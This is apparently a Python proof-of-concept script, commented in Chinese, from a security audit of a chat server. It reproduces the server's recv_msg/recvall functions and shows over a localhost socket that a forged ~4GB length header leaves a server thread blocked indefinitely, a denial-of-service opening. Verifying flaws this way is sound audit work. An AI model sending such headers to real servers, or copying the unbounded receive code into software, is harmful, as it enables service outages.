"""
漏洞验证脚本：Python 服务端 recv_msg/recvall 无消息长度限制（对应漏洞#2）
直接从 server.py 复制的 recv_msg/recvall 实现，用真实 socket 验证：
发送声明为 0xFFFFFFFF (~4GB) 的消息长度头时，recv_msg 不会立即拒绝，
而是持续阻塞接收——攻击者可借此占住服务器线程（DoS 基础）。
"""
import socket
import struct
import json
import threading
import time


# ---- 以下函数与 server.py 中 recv_msg/recvall 完全一致 ----
def recvall(sock, n):
    data = b''
    while len(data) < n:
        try:
            packet = sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        except socket.timeout:
            return None
        except Exception as e:
            return None
    return data


def recv_msg(sock):
    try:
        header = recvall(sock, 4)
        if not header:
            return None
        msg_len = struct.unpack('!I', header)[0]
        data = recvall(sock, msg_len)
        if not data:
            return None
        try:
            return json.loads(data.decode('utf-8'))
        except json.JSONDecodeError:
            return data.decode('utf-8')
    except Exception as e:
        return None


def main():
    # 本地建立 TCP 对
    srv = socket.socket()
    srv.bind(('127.0.0.1', 0))
    srv.listen(1)
    port = srv.getsockname()[1]

    attacker = socket.socket()
    attacker.connect(('127.0.0.1', port))
    victim, _ = srv.accept()

    # 攻击者发送 4 字节长度头，声明消息体为 0xFFFFFFFF (~4GB)
    attacker.sendall(struct.pack('!I', 0xFFFFFFFF))
    print("[*] 已发送长度头: 0xFFFFFFFF (~4GB)")

    result = {}
    t = threading.Thread(target=lambda: result.setdefault('v', recv_msg(victim)))
    t.start()
    time.sleep(1.0)

    if t.is_alive():
        print("[!] 确认漏洞#2: recv_msg 收到 4GB 声明后未拒绝、未报错，仍在阻塞接收")
        print("[!] 服务器线程被永久占用（若攻击者持续发连接+头，可耗尽线程）")
    else:
        print("[?] recv_msg 已返回:", result.get('v'))
        print("[!] 说明存在长度上限检查（与代码不符，需复查）")

    # 发送少量数据，观察它是否继续吞数据（证明没有上限校验）
    attacker.sendall(b'{"type":"private_chat","to":"victim","content":"')
    time.sleep(0.5)
    if t.is_alive():
        print("[!] 收到部分数据后仍在继续接收（无上限校验，会一直累积到 4GB）")

    t.join(timeout=0.2)
    victim.close()
    attacker.close()
    srv.close()


if __name__ == '__main__':
    main()
